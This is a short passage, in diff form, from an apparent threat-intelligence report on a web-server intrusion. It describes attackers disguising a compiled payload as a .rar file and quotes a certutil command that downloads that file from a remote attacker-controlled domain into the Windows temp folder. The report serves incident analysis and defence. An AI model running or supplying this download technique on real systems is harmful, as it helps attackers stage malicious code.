@@ -1,0 +1,8 @@
+
+ output file.
+The attackers wrote their second-stage payload and compiled it with WMI.
+Finally, they uploaded the compiled “.bmf”
+ file to their web server and modified the file to masquerade as a \".rar\" file .
+Upon further assessment of the activity, we observed that after the threat actors gained access to the affected web server, they utilized a Windows native binary called “Certutil.exe” to download malicious code from a remote resource .
+Our investigation revealed that an instance of the process “Certutil.exe” was executed with the following command line arguments: certutil  -urlcache
+ -split -f http://[DOMAIN]/uploads/180307/l.rar c:\\windows\\temp\\l.rar Options Description -urlcache Display or delete URL cache entries -split Split embedded ASN.1 elements, and save to files -f Force overwrite (Source: Microsoft certutil page )
